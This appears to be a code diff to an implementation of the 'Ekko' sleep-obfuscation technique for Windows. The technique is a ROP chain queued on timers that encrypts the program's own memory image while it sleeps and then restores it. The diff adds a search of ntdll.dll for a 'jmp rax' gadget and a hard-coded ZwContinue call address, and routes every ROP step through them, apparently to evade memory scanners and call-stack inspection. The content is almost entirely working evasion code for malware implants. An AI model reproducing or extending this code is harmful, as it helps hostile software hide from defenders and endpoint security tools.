@@ -1,5 +1,9 @@
 #include <Common.h>
 #include <Ekko.h>
+#include <Windows.h>
+#include <psapi.h>
+#include <winternl.h>
+
 
 VOID EkkoObf( DWORD SleepTime )
 {
@@ -26,6 +30,30 @@ VOID EkkoObf( DWORD SleepTime )
 
     PVOID   NtContinue  = NULL;
     PVOID   SysFunc032  = NULL;
+
+    PVOID ntdll_jmprax = NULL;
+    
+    HANDLE process = GetCurrentProcess();
+    MODULEINFO mi = {};
+    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
+    
+    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
+    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll + 4096;
+
+    CHAR jmprax_bytecode[2] = {0xFF, 0xE0};
+
+
+    for (LPVOID ntdll_cursor=ntdllBase;;ntdll_cursor++) {
+        if (strncmp(ntdll_cursor, jmprax_bytecode, 2) == 0) {
+            ntdll_jmprax = ntdll_cursor;
+            break;
+        }
+    }
+
+
+    PVOID ntdll_callzw = (PVOID)0x00007FFB300FDDD0;
+    printf("(ntdll.dll) JMP RAX ->  %p\n", ntdll_jmprax);
+    printf("(ntdll.dll) CALL ZwContinue -> %p\n", ntdll_callzw);
 
     hEvent      = CreateEventW( 0, 0, 0, 0 );
     hTimerQueue = CreateTimerQueue();
@@ -55,7 +83,8 @@ VOID EkkoObf( DWORD SleepTime )
 
         // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
         RopProtRW.Rsp  -= 8;
-        RopProtRW.Rip   = VirtualProtect;
+        RopProtRW.Rax   = VirtualProtect;
+        RopProtRW.Rip   = ntdll_jmprax;
         RopProtRW.Rcx   = ImageBase;
         RopProtRW.Rdx   = ImageSize;
         RopProtRW.R8    = PAGE_READWRITE;
@@ -63,25 +92,29 @@ VOID EkkoObf( DWORD SleepTime )
 
         // SystemFunction032( &Key, &Img );
         RopMemEnc.Rsp  -= 8;
-        RopMemEnc.Rip   = SysFunc032;
+        RopMemEnc.Rax   = SysFunc032;
+        RopMemEnc.Rip   = ntdll_jmprax;
         RopMemEnc.Rcx   = &Img;
         RopMemEnc.Rdx   = &Key;
 
         // WaitForSingleObject( hTargetHdl, SleepTime );
         RopDelay.Rsp   -= 8;
-        RopDelay.Rip    = WaitForSingleObject;
+        RopDelay.Rax    = WaitForSingleObject;
+        RopDelay.Rip   = ntdll_jmprax;
         RopDelay.Rcx    = NtCurrentProcess();
         RopDelay.Rdx    = SleepTime;
 
         // SystemFunction032( &Key, &Img );
         RopMemDec.Rsp  -= 8;
-        RopMemDec.Rip   = SysFunc032;
+        RopMemDec.Rax   = SysFunc032;
+        RopMemDec.Rip   = ntdll_jmprax;
         RopMemDec.Rcx   = &Img;
         RopMemDec.Rdx   = &Key;
 
         // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
         RopProtRX.Rsp  -= 8;
-        RopProtRX.Rip   = VirtualProtect;
+        RopProtRX.Rax   = VirtualProtect;
+        RopProtRX.Rip   = ntdll_jmprax;
         RopProtRX.Rcx   = ImageBase;
         RopProtRX.Rdx   = ImageSize;
         RopProtRX.R8    = PAGE_EXECUTE_READWRITE;
@@ -89,17 +122,18 @@ VOID EkkoObf( DWORD SleepTime )
 
         // SetEvent( hEvent );
         RopSetEvt.Rsp  -= 8;
-        RopSetEvt.Rip   = SetEvent;
+        RopSetEvt.Rax   = SetEvent;
+        RopSetEvt.Rip   = ntdll_jmprax;
         RopSetEvt.Rcx   = hEvent;
 
         puts( "[INFO] Queue timers" );
 
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );
 
         puts( "[INFO] Wait for hEvent" );
 
